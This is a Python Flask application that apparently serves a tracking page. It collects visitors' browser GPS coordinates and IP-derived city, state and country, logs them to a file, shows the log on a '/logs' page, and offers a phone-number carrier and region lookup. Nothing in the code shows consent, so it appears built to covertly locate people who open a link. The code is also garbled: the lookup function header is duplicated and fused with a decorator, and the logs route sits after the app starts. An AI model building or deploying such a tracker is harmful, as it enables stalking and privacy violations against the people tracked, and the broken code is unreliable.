from flask import Flask, render_template, request, jsonify
import phonenumbers
from phonenumbers import carrier, geocoder
from datetime import datetime
import requests

app = Flask(__name__)
LOG_FILE = "log.txt"


def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0]
    return request.remote_addr


def get_ip_details(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "city": res.get("city"),
            "state": res.get("regionName"),
            "country": res.get("country")
        }
    except:
        return {"city": "N/A", "state": "N/A", "country": "N/A"}


@app.route("/")
def dashboard():
    return render_template("dashboard.html")


@app.route("/track")
def track():
    return render_template("tracker.html")


@app.route("/save_location", methods=["POST"])
def save_location():
    data = request.json
    lat = data.get("latitude", "N/A")
    lon = data.get("longitude", "N/A")
    ip = get_client_ip()
    location = get_ip_details(ip)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(LOG_FILE, "a") as f:
        f.write(
            f"{time} | IP:{ip} | "
            f"Lat:{lat} | Long:{lon} | "
            f"City:{location['city']} | "
            f"State:{location['state']} | "
            f"Country:{location['country']}\n"
        )

    return jsonify({"status": "saved"})


@app.route("/lookup", methods=["POST"])
def lookup():@app.route("/lookup", methods=["POST"])
def lookup():
    number = request.form.get("number")

    try:
        # Agar + nahi hai to India (+91) maan lo
        if not number.startswith("+"):
            number = "+91" + number

        parsed = phonenumbers.parse(number)
        isp = carrier.name_for_number(parsed, "en")
        region = geocoder.description_for_number(parsed, "en")

        return jsonify({
            "isp": isp or "Unknown",
            "region": region or "Unknown"
        })

    except:
        return jsonify({"error": "Invalid or unsupported phone number"})



if __name__ == "__main__":
    app.run(debug=True)



@app.route("/logs")
def view_logs():
    try:
        with open("log.txt") as f:
            lines = f.readlines()
    except:
        lines = []

    return render_template("logs.html", logs=lines)



